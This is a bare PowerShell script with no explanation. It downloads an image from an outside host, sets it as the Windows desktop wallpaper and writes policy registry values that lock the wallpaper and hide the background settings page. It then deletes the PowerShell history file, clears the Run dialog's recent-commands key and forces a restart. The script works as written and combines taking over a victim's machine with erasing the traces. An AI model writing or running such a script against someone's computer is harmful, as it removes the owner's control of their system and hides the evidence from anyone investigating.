$imageUrl = "https://pixy.org/src/465/4657011.jpg"
$imagePath = "$env:USERPROFILE\Downloads\background.jpg"

Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public const int SPI_SETDESKWALLPAPER = 20;
    public const int SPIF_UPDATEINIFILE = 0x01;
    public const int SPIF_SENDWININICHANGE = 0x02;

    public static void SetWallpaper(string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}
"@

[Wallpaper]::SetWallpaper($imagePath)

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

Set-ItemProperty -Path $regPath -Name "NoChangingWallpaper" -Value 1

$regPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $regPath2)) {
    New-Item -Path $regPath2 -Force | Out-Null
}

Set-ItemProperty -Path $regPath2 -Name "NoDispBackgroundPage" -Value 1

Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

$runMruRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path $runMruRegPath) {
    Remove-Item -Path $runMruRegPath -Recurse -Force
    New-Item -Path $runMruRegPath | Out-Null
}

Restart-Computer -Force
